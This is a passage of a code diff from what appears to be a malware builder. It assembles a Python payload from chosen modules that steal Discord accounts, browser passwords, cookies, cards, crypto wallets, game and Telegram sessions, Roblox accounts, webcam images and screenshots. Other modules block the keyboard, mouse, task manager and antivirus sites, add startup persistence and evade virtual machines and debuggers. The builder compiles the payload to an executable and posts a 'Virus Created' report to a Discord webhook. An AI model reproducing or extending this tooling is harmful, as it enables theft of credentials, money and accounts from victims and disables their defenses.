+                    browser_choice.append('"cookies"')
+                if option_history == 'Enable':
+                    browser_choice.append('"history"')
+                if option_downloads == 'Enable':
+                    browser_choice.append('"downloads"')
+                if option_cards == 'Enable':
+                    browser_choice.append('"cards"')
+
+                session_files_choice = []
+                if option_wallets == 'Enable':
+                    session_files_choice.append('"Wallets"')
+                if option_game_launchers == 'Enable':
+                    session_files_choice.append('"Game Launchers"')
+                if option_apps == 'Enable':
+                    session_files_choice.append('"Apps"')
 
                 with open(file_python, 'w', encoding='utf-8') as file:
 
@@ -385,22 +494,25 @@ try:
                         file.write(Sy5t3mInf0)
 
                     if option_discord == 'Enable':
-                        file.write(Di5c0rdT0k3n)
+                        file.write(Di5c0rdAccount)
 
                     if option_discord_injection == 'Enable':
                         file.write(Di5c0rdIj3ct10n)
 
-                    if option_browser == 'Enable':
-                        file.write(Br0w53r5t341)
+                    if option_interesting_files == 'Enable':
+                        file.write(Int3r3stingFil3s)
+
+                    if session_files_choice:
+                        file.write(S3ssi0nFil3s.replace('"%SESSION_FILES_CHOICE%"', ', '.join(session_files_choice)))
+
+                    if browser_choice:
+                        file.write(Br0w53r5t341.replace('"%BROWSER_CHOICE%"', ', '.join(browser_choice)))
 
                     if option_roblox == 'Enable':
-                        file.write(R0b10xC00ki3)
+                        file.write(R0b10xAccount)
 
-                    if option_camera_capture == 'Enable':
-                        file.write(C4m3r4C4ptur3)
-
-                    if option_open_user_profil_settings == 'Enable':
-                        file.write(Op3nU53rPr0fi1353tting5)
+                    if option_webcam == 'Enable':
+                        file.write(W3bc4m)
 
                     if option_screenshot == 'Enable':
                         file.write(Scr33n5h0t)
@@ -507,49 +619,72 @@ try:
             except: pass
 
     def SendWebhook(webhook):
-        try:
-            fields = [
-                {"name": f"File Name:",          "value": f"""```{name_file}```""",                        "inline": True},
-                {"name": f"File Type:",          "value": f"""```{file_type}```""",                        "inline": True},
-                {"name": f"System Info:",        "value": f"""```{option_system}```""",                    "inline": True},
-                {"name": f"Discord Token:",      "value": f"""```{option_discord}```""",                   "inline": True},
-                {"name": f"Discord Injection:",  "value": f"""```{option_discord_injection}```""",         "inline": True},
-                {"name": f"Browser Steal:",      "value": f"""```{option_browser}```""",                   "inline": True},
-                {"name": f"Roblox Cookie:",      "value": f"""```{option_roblox}```""",                    "inline": True},
-                {"name": f"Camera Capture:",     "value": f"""```{option_camera_capture}```""",            "inline": True},
-                {"name": f"Screenshot:",         "value": f"""```{option_screenshot}```""",                "inline": True},
-                {"name": f"Open UserProfil:",    "value": f"""```{option_open_user_profil_settings}```""", "inline": True},
-                {"name": f"Block Key:",          "value": f"""```{option_block_key}```""",                 "inline": True},
-                {"name": f"Block Mouse:",        "value": f"""```{option_block_mouse}```""",               "inline": True},
-                {"name": f"Block Task Manager:", "value": f"""```{option_block_task_manager}```""",        "inline": True},
-                {"name": f"Block AV Website:",   "value": f"""```{option_block_website}```""",             "inline": True},
-                {"name": f"Shutdown:",           "value": f"""```{option_shutdown}```""",                  "inline": True},
-                {"name": f"Spam Open Program:",  "value": f"""```{option_spam_open_programs}```""",        "inline": True},
-                {"name": f"Spam Create File:",   "value": f"""```{option_spam_create_files}```""",         "inline": True},
-                {"name": f"Fake Error:",         "value": f"""```{option_fake_error}```""",                "inline": True},
-                {"name": f"Launch At Startup:",  "value": f"""```{option_startup}```""",                   "inline": True},
-                {"name": f"Restart Every 5min:", "value": f"""```{option_restart}```""",                   "inline": True},
-                {"name": f"Anti VM & Debug:",    "value": f"""```{option_anti_vm_and_debug}```""",         "inline": True},
-                {"name": f"Webhook:",            "value": f"""{webhook}""",                                "inline": True},
-            ]
-
-            embed = {
-                'title': f'Virus Created:',
-                'color': color_webhook,
-                "fields": fields,
-                'footer': {
-                    "text": username_webhook,
-                    "icon_url": avatar_webhook,
-                    }
+        embed_config = {
+            'title': f'Virus Created (Config):',
+            'color': color_webhook,
+            "fields": [
+                {"name": f"Name:",                   "value": f"""```{name_file}```""",                        "inline": True},
+                {"name": f"Type:",                   "value": f"""```{file_type}```""",                        "inline": True},
+                {"name": f"Webhook:",                "value": f"""{webhook}""",                                "inline": False},
+            ],
+            'footer': {
+                "text": username_webhook,
+                "icon_url": avatar_webhook,
                 }
-            
-            response = requests.post(webhook, data=json.dumps({
-                'embeds': [embed],
-                'username': username_webhook,
-                'avatar_url': avatar_webhook
-                }), headers={'Content-Type': 'application/json'})
-
-        except: pass
+            }
+        
+        embed_stealer = {
+            'title': f'Virus Created (Stealer):',
+            'color': color_webhook,
+            "fields": [
+                {"name": f"System Info:",            "value": f"""```{option_system}```""",                    "inline": True},
+                {"name": f"Wallets Session Files:",  "value": f"""```{option_game_launchers}```""",            "inline": True},
+                {"name": f"Games Session Files:",    "value": f"""```{option_system}```""",                    "inline": True},
+                {"name": f"Telegram Session Files:", "value": f"""```{option_apps}```""",                      "inline": True},
+                {"name": f"Roblox Accounts:",        "value": f"""```{option_roblox}```""",                    "inline": True},
+                {"name": f"Discord Accounts:",       "value": f"""```{option_discord}```""",                   "inline": True},
+                {"name": f"Discord Injection:",      "value": f"""```{option_discord_injection}```""",         "inline": True},
+                {"name": f"Passwords:",              "value": f"""```{option_passwords}```""",                 "inline": True},
+                {"name": f"Cookies:",                "value": f"""```{option_cookies}```""",                   "inline": True},
+                {"name": f"Browsing History:",       "value": f"""```{option_history}```""",                   "inline": True},
+                {"name": f"Download History:",       "value": f"""```{option_downloads}```""",                 "inline": True},
+                {"name": f"Cards:",                  "value": f"""```{option_cards}```""",                     "inline": True},
+                {"name": f"Extentions:",             "value": f"""```{option_extentions}```""",                "inline": True},
+                {"name": f"Interesting Files:",      "value": f"""```{option_interesting_files}```""",         "inline": True},
+                {"name": f"Webcam:",                 "value": f"""```{option_webcam}```""",                    "inline": True},
+                {"name": f"Screenshot:",             "value": f"""```{option_screenshot}```""",                "inline": True},
+            ],
+            'footer': {
+                "text": username_webhook,
+                "icon_url": avatar_webhook,
+                }
+            }
+        
+        embed_malware = {
+            'title': f'Virus Created (Malware):',
+            'color': color_webhook,
+            "fields": [
+                {"name": f"Block Key:",              "value": f"""```{option_block_key}```""",                 "inline": True},
+                {"name": f"Block Mouse:",            "value": f"""```{option_block_mouse}```""",               "inline": True},
+                {"name": f"Block Task Manager:",     "value": f"""```{option_block_task_manager}```""",        "inline": True},
+                {"name": f"Block AV Website:",       "value": f"""```{option_block_website}```""",             "inline": True},
+                {"name": f"Shutdown:",               "value": f"""```{option_shutdown}```""",                  "inline": True},
+                {"name": f"Spam Open Program:",      "value": f"""```{option_spam_open_programs}```""",        "inline": True},
+                {"name": f"Spam Create File:",       "value": f"""```{option_spam_create_files}```""",         "inline": True},
+                {"name": f"Fake Error:",             "value": f"""```{option_fake_error}```""",                "inline": True},
+                {"name": f"Launch At Startup:",      "value": f"""```{option_startup}```""",                   "inline": True},
+                {"name": f"Restart Every 5min:",     "value": f"""```{option_restart}```""",                   "inline": True},
+                {"name": f"Anti VM & Debug:",        "value": f"""```{option_anti_vm_and_debug}```""",         "inline": True},
+            ],
+            'footer': {
+                "text": username_webhook,
+                "icon_url": avatar_webhook,
+                }
+            }
+        
+        requests.post(webhook, data=json.dumps({'embeds': [embed_config],  'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
+        requests.post(webhook, data=json.dumps({'embeds': [embed_stealer], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
+        requests.post(webhook, data=json.dumps({'embeds': [embed_malware], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers={'Content-Type': 'application/json'})
         
     def ConvertToExe(file_python, path_destination, name_file, icon_path=None):
         if sys.platform.startswith("win"):
@@ -633,7 +768,7 @@ try:
     except: pass
     try: SendWebhook(webhook)
     except: pass
-    time.sleep(20)
+    Continue()
     Reset()
 except Exception as e: 
     Error(e)
